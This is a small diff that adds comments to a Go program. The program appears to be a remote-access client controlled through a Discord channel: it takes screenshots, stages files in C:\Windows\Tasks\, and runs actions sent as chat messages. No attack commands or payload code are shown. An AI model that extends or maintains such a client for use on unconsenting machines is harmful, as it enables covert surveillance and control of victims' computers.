@@ -14,6 +14,7 @@ import (
 	"github.com/kbinani/screenshot"
 )
 
+// getTmpDir returns an OS-specific directory for temporary files used by the client.
 func getTmpDir() string {
 	if runtime.GOOS == "windows" {
 		return "C:\\Windows\\Tasks\\"
@@ -22,6 +23,7 @@ func getTmpDir() string {
 	}
 }
 
+// handler processes control messages from Discord and executes the requested action on the client.
 func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	if m.ChannelID != myChannelId || m.Author.ID == s.State.User.ID {
 		return
@@ -117,4 +119,3 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 		}
 	}
 }
-
